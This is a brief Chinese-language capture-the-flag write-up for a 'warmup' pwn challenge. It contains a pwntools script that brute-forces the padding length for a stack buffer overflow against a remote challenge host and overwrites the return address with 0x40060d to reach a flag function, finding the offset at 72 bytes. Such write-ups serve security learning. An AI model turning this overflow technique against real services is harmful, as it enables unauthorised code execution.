# warmup

本题没有附件，给出了一个地址，而且什么保护都没开，

所以用fuzzing尝试。

## exp
```python
import pwn

pwn.context(os='linux')

for i in range(100):
    p = pwn.remote('220.249.52.133', '39647')

    payload = b'a' * (i * 4) + pwn.p64(0x40060d)
    print(i * 4)
    p.sendlineafter(b'>', payload)
    try:
        print(p.recv())
    except:
        pass
```

当i * 4 == 64时，会重新出现提示符，应该是跳转回main()？
而当i * 4 == 72时，返回地址刚好覆盖到rip，跳转到目标函数，得到flag。